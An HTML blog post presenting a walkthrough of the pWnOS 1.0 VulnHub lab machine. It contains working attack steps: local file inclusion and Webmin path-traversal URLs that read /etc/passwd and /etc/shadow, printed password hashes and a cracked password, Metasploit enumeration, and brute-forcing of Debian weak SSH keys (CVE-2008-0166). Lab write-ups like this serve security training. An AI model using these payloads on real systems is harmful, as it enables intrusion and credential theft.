
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>pWnOS: 1.0 - 0x41414141</title>
  <meta name="author" content="Norbert Szetei">

  
  <meta name="description" content="Image: pWnOS: 1.0 Nmap output: 1
2
3
4
5
6
7
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
80/tcp open http &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://73696e65.github.io/blog/2015/05/10/pwnos-1-dot-0/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="0x41414141" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">0x41414141</a></h1>
  
    <h2>information security notes</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="73696e65.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">pWnOS: 1.0</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-10T12:13:34+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:13 pm</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/pwnos-10,33/">pWnOS: 1.0</a></p>

<p>Nmap output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>22/tcp    open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
</span><span class='line'>80/tcp    open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
</span><span class='line'>10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></td></tr></table></div></figure>


<p>After a while of browsing the web page, we found trivial LFI vulnerability:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://193.168.0.25/index1.php?help=true&connect=../../../../etc/passwd
</span><span class='line'>
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>dhcp:x:100:101::/nonexistent:/bin/false
</span><span class='line'>syslog:x:101:102::/home/syslog:/bin/false
</span><span class='line'>klog:x:102:103::/home/klog:/bin/false
</span><span class='line'>mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash
</span><span class='line'>obama:x:1001:1001::/home/obama:/bin/bash
</span><span class='line'>osama:x:1002:1002::/home/osama:/bin/bash
</span><span class='line'>yomama:x:1003:1003::/home/yomama:/bin/bash</span></code></pre></td></tr></table></div></figure>


<p>We can find a lot of information querying the samba service too:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/vulnhub/pwnos# nmblookup -A 192.168.0.25
</span><span class='line'>Looking up status of 192.168.0.25
</span><span class='line'>        UBUNTUVM        &lt;00> -         H &lt;ACTIVE>
</span><span class='line'>        UBUNTUVM        &lt;03> -         H &lt;ACTIVE>
</span><span class='line'>        UBUNTUVM        &lt;20> -         H &lt;ACTIVE>
</span><span class='line'>        ..__MSBROWSE__. &lt;01> - &lt;GROUP> H &lt;ACTIVE>
</span><span class='line'>        MSHOME          &lt;1d> -         H &lt;ACTIVE>
</span><span class='line'>        MSHOME          &lt;1e> - &lt;GROUP> H &lt;ACTIVE>
</span><span class='line'>        MSHOME          &lt;00> - &lt;GROUP> H &lt;ACTIVE>
</span><span class='line'>
</span><span class='line'>        MAC Address = 00-00-00-00-00-00
</span><span class='line'>
</span><span class='line'>root@kali:~/vulnhub/pwnos# smbclient -L\\UBUNTUVM -I 192.168.0.25 -N
</span><span class='line'>Anonymous login successful
</span><span class='line'>Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]
</span><span class='line'>
</span><span class='line'>        Sharename       Type      Comment
</span><span class='line'>        ---------       ----      -------
</span><span class='line'>        home            Disk      Home Directory for vmware User
</span><span class='line'>        print$          Disk      Printer Drivers
</span><span class='line'>        IPC$            IPC       IPC Service (ubuntuvm)
</span><span class='line'>Anonymous login successful
</span><span class='line'>Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]
</span><span class='line'>
</span><span class='line'>        Server               Comment
</span><span class='line'>        ---------            -------
</span><span class='line'>        UBUNTUVM             ubuntuvm
</span><span class='line'>
</span><span class='line'>        Workgroup            Master
</span><span class='line'>        ---------            -------
</span><span class='line'>        MSHOME               UBUNTUVM</span></code></pre></td></tr></table></div></figure>


<p>There are a few enumeration modules in metasploit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) > use auxiliary/scanner/smb/pipe_auditor
</span><span class='line'>msf auxiliary(pipe_auditor) > setg RHOSTS 192.168.0.25
</span><span class='line'>RHOSTS => 192.168.0.25
</span><span class='line'>msf auxiliary(pipe_auditor) > exploit
</span><span class='line'>
</span><span class='line'>[*] 192.168.0.25 - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \lsass, \ntsvcs, \srvsvc, \wkssvc
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed
</span><span class='line'>
</span><span class='line'>msf auxiliary(smb_enumshares) > use auxiliary/scanner/smb/smb_enumusers
</span><span class='line'>msf auxiliary(smb_enumusers) > exploit
</span><span class='line'>
</span><span class='line'>[*] 192.168.0.25 UBUNTUVM [ games, nobody, proxy, syslog, www-data, root, news, bin, mail, dhcp, daemon, sshd, man, lp, mysql, gnats, backup, sys, klog, vmware, list, irc, sync, uucp ] ( LockoutTries=0 PasswordMin=5 )
</span><span class='line'>
</span><span class='line'>msf auxiliary(smb_login) > use auxiliary/scanner/smb/smb_lookupsid
</span><span class='line'>msf auxiliary(smb_lookupsid) > exploit
</span><span class='line'>
</span><span class='line'>[*] 192.168.0.25 PIPE(LSARPC) LOCAL(UBUNTUVM - 5-21-2952145021-507220021-499326276) DOMAIN(MSHOME - )
</span><span class='line'>[*] 192.168.0.25 USER=nobody RID=501
</span><span class='line'>[*] 192.168.0.25 GROUP=None RID=513
</span><span class='line'>[*] 192.168.0.25 USER=root RID=1000
</span><span class='line'>[*] 192.168.0.25 USER=daemon RID=1002
</span><span class='line'>[*] 192.168.0.25 USER=bin RID=1004
</span><span class='line'>[*] 192.168.0.25 USER=sys RID=1006
</span><span class='line'>[*] 192.168.0.25 USER=sync RID=1008
</span><span class='line'>[*] 192.168.0.25 USER=games RID=1010
</span><span class='line'>[*] 192.168.0.25 USER=man RID=1012
</span><span class='line'>[*] 192.168.0.25 USER=lp RID=1014
</span><span class='line'>[*] 192.168.0.25 USER=mail RID=1016
</span><span class='line'>[*] 192.168.0.25 USER=news RID=1018
</span><span class='line'>[*] 192.168.0.25 USER=uucp RID=1020
</span><span class='line'>[*] 192.168.0.25 USER=proxy RID=1026
</span><span class='line'>[*] 192.168.0.25 USER=www-data RID=1066
</span><span class='line'>[*] 192.168.0.25 USER=backup RID=1068
</span><span class='line'>[*] 192.168.0.25 USER=list RID=1076
</span><span class='line'>[*] 192.168.0.25 USER=irc RID=1078
</span><span class='line'>[*] 192.168.0.25 USER=gnats RID=1082
</span><span class='line'>[*] 192.168.0.25 USER=dhcp RID=1200
</span><span class='line'>[*] 192.168.0.25 USER=syslog RID=1202
</span><span class='line'>[*] 192.168.0.25 USER=klog RID=1204
</span><span class='line'>[*] 192.168.0.25 USER=mysql RID=1206
</span><span class='line'>[*] 192.168.0.25 USER=sshd RID=1208
</span><span class='line'>[*] 192.168.0.25 USER=vmware RID=3000
</span><span class='line'>[*] 192.168.0.25 UBUNTUVM [nobody, root, daemon, bin, sys, sync, games, man, lp, mail, news, uucp, proxy, www-data, backup, list, irc, gnats, dhcp, syslog, klog, mysql, sshd, vmware ]
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>The webmin is vulnerable and the exploit in metasploit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Name: Webmin File Disclosure
</span><span class='line'>     Module: auxiliary/admin/webmin/file_disclosure
</span><span class='line'>    License: Metasploit Framework License (BSD)
</span><span class='line'>       Rank: Normal
</span><span class='line'>  Disclosed: 2006-06-30</span></code></pre></td></tr></table></div></figure>


<p>Basically the exploitation could be performed on command line to disclose arbitrary file, for example:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.conf
</span><span class='line'>
</span><span class='line'>http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.users
</span><span class='line'>
</span><span class='line'>http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.pem</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow
</span><span class='line'>
</span><span class='line'>root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
</span><span class='line'>daemon:*:14040:0:99999:7:::
</span><span class='line'>bin:*:14040:0:99999:7:::
</span><span class='line'>sys:*:14040:0:99999:7:::
</span><span class='line'>sync:*:14040:0:99999:7:::
</span><span class='line'>games:*:14040:0:99999:7:::
</span><span class='line'>man:*:14040:0:99999:7:::
</span><span class='line'>lp:*:14040:0:99999:7:::
</span><span class='line'>mail:*:14040:0:99999:7:::
</span><span class='line'>news:*:14040:0:99999:7:::
</span><span class='line'>uucp:*:14040:0:99999:7:::
</span><span class='line'>proxy:*:14040:0:99999:7:::
</span><span class='line'>www-data:*:14040:0:99999:7:::
</span><span class='line'>backup:*:14040:0:99999:7:::
</span><span class='line'>list:*:14040:0:99999:7:::
</span><span class='line'>irc:*:14040:0:99999:7:::
</span><span class='line'>gnats:*:14040:0:99999:7:::
</span><span class='line'>nobody:*:14040:0:99999:7:::
</span><span class='line'>dhcp:!:14040:0:99999:7:::
</span><span class='line'>syslog:!:14040:0:99999:7:::
</span><span class='line'>klog:!:14040:0:99999:7:::
</span><span class='line'>mysql:!:14040:0:99999:7:::
</span><span class='line'>sshd:!:14040:0:99999:7:::
</span><span class='line'>vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
</span><span class='line'>obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
</span><span class='line'>osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
</span><span class='line'>yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::</span></code></pre></td></tr></table></div></figure>


<p>Using john on /etc/shadow, we obtain credentials of user vmware for successful login to the system:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>h4ckm3           (vmware)</span></code></pre></td></tr></table></div></figure>


<p>The box could be rooted using standard vmsplice exploit.</p>

<p>However, there is another way to get user account. The script
<a href="https://wiki.debian.org/SSLkeys#Testing_keys_using_dowkd.pl">dowkd.pl</a> ensures
us that the OpenSSL is vulnerable
(<a href="https://security-tracker.debian.org/tracker/CVE-2008-0166">CVE-2008-0166</a>).</p>

<p>We download and unpack already generated RSA keys from offensive-security repository:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/debian_ssh_rsa_2048_x86.tar.bz2</span></code></pre></td></tr></table></div></figure>


<p>Because usage of weak private keys could be blacklisted on our server, we use
the following
<a href="https://unix.stackexchange.com/questions/109908/public-key-f36e8704ea2db360ff42ad26671794d5-blacklisted-see-ssh">instructions</a>
to enable them.</p>

<p>Basically adding this directive to our ssh_config file should be sufficient:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>UseBlacklistedKeys yes</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>In exploitdb, we use python script to try every possible private key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python platforms/linux/remote/5720.py /tmp/rsa/2048 192.168.0.25 obama
</span><span class='line'>
</span><span class='line'>Key Found in file: dcbe2a56e8cdea6d17495f6648329ee2-4679
</span><span class='line'>Execute: ssh -lobama -p22 -i /tmp/rsa/2048/dcbe2a56e8cdea6d17495f6648329ee2-4679 192.168.0.25</span></code></pre></td></tr></table></div></figure>

</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Norbert Szetei</span></span>

      




<time class='entry-date' datetime='2015-05-10T12:13:34+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:13 pm</span></time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/pwnos/'>pwnos</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://73696e65.github.io/blog/2015/05/10/pwnos-1-dot-0/" data-via="" data-counturl="http://73696e65.github.io/blog/2015/05/10/pwnos-1-dot-0/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/05/10/de-ice-s2-dot-100/" title="Previous Post: DE-ICE-S2.100">&laquo; DE-ICE-S2.100</a>
      
      
        <a class="basic-alignment right" href="/blog/2015/05/10/kioptrix-level-1/" title="Next Post: Kioptrix: Level 1">Kioptrix: Level 1 &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/05/10/holynix-v2/">Holynix: V2</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/05/10/holynix-v1/">Holynix: V1</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/05/10/kioptrix-level-1/">Kioptrix: Level 1</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/05/10/pwnos-1-dot-0/">pWnOS: 1.0</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/05/10/de-ice-s2-dot-100/">DE-ICE-S2.100</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - Norbert Szetei -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
